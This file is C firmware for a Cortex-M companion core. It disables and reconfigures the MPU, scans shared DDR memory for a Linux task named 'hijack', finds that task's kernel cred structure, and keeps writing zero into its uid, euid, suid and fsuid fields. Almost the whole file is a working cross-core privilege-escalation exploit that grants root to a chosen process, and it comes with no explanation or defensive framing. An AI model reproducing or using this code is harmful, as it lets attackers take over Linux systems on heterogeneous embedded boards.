#include <stdio.h>
#include "board.h"
#include "fsl_debug_console.h"
#include "pin_mux.h"

const uint64_t kernel_start = 0x40000000;
const uint64_t page_offset =  ((uint64_t)(0xffffffffffffffff) << (47 - 1));
const uint64_t DDR_start = 0x40000000;
const uint64_t DDR_end =   0xC0000000;

uint32_t* virt_to_phys(uint64_t virt) {
   return (virt & ~page_offset) + kernel_start;
}

int is_aligned(uint64_t addr) {
   return (addr & 0x3) == 0;
}

int is_valid_addr(uint64_t phys_addr) {
   return is_aligned(phys_addr) && phys_addr >= DDR_start && phys_addr < DDR_end; 
}

struct cred {
   uint32_t usage; /* refcounter */
   uint32_t          uid;            /* real UID of the task */
   uint32_t          gid;            /* real GID of the task */
   uint32_t          suid;           /* saved UID of the task */
   uint32_t          sgid;           /* saved GID of the task */
   uint32_t          euid;           /* effective UID of the task */
   uint32_t          egid;           /* effective GID of the task */
   uint32_t          fsuid;
};

void DumpHex(const void* data, size_t size) {
   char ascii[17];
   size_t i, j;
   ascii[16] = '\0';
   for (i = 0; i < size; ++i) {
      printf("%02X ", ((unsigned char*)data)[i]);
      if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
	 ascii[i % 16] = ((unsigned char*)data)[i];
      } else {
	 ascii[i % 16] = '.';
      }
      if ((i+1) % 8 == 0 || i+1 == size) {
	 printf(" ");
	 if ((i+1) % 16 == 0) {
	    printf("|  %s \r\n", ascii);
	 } else if (i+1 == size) {
	    ascii[(i+1) % 16] = '\0';
	    if ((i+1) % 16 <= 8) {
	       printf(" ");
	    }
	    for (j = (i+1) % 16; j < 16; ++j) {
	       printf("   ");
	    }
	    printf("|  %s \r\n", ascii);
	 }
      }
   }
   printf("\r\n");
}

uint8_t* find_process(const char* find) {
   int len = strlen(find);

   for(uint8_t *s = 0x0000000070000000; s < 0xC0000000; s++) {
      if((((uint32_t)s) & 0x64fffff) == 0x6400000) {
	 printf("AT %p\r\n", s);
      }

      int found = true;
      uint8_t *c = s;
      for(int i = 0; i < len; i++) {
	 if(*c != find[i]) {
	    found = false;
	    break;
	 }
	 c++;
      }

      if(found && is_aligned(s)) {
	 uint64_t cred_virt = *(uint64_t*)(s - 16) /* sizeof two 64bit pointers to cred structures */;
	 uint64_t cred_phys = virt_to_phys(cred_virt);

	 if(!is_valid_addr(cred_phys)) {
	    printf("addr not valid %llx %llx\r\n", cred_virt, cred_phys);
	 } else {
	    printf("found: %llx %llx\r\n", cred_virt, cred_phys); 
	    DumpHex(s-16, 128);

	    struct cred *real_cred = cred_phys;
	    printf("%u\r\n", real_cred->uid);

	    if(real_cred->uid == 1000) {
	       printf("propably found process\r\n");

	       for(;;) {
		  real_cred->usage = 2000;
		  __DSB();
		  real_cred->uid = 0;
		  __DSB();
		  real_cred->suid = 0;
		  __DSB();
		  real_cred->fsuid = 0;
		  __DSB();
		  real_cred->euid = 0;
		  __DSB();
	       }

	       return s;
	    }
	 }
      }
   }

   printf("done\r\n");
   for(;;);
   return NULL;
}



int main(void) {
   BOARD_RdcInit();
   BOARD_BootClockRUN();
   BOARD_InitDebugConsole();
   //    BOARD_InitMemory();

   MPU->CTRL = 0;

   MPU->RBAR = (0x40000000U & MPU_RBAR_ADDR_Msk) | MPU_RBAR_VALID_Msk | (2 << MPU_RBAR_REGION_Pos);
   MPU->RASR =
      (0x3 << MPU_RASR_AP_Pos) | (0x1 << MPU_RASR_B_Pos) | (ARM_MPU_REGION_SIZE_2GB << MPU_RASR_SIZE_Pos) | MPU_RASR_ENABLE_Msk;



   MPU->CTRL = MPU_CTRL_ENABLE_Msk | MPU_CTRL_PRIVDEFENA_Msk;
   __DSB();
   __ISB();


   printf("=========================\r\n");
   uint32_t proc_comm = find_process("hijack");
   if(!proc_comm) {
      printf("process not found!\r\n");
      for(;;);
   }
   for(;;);
}
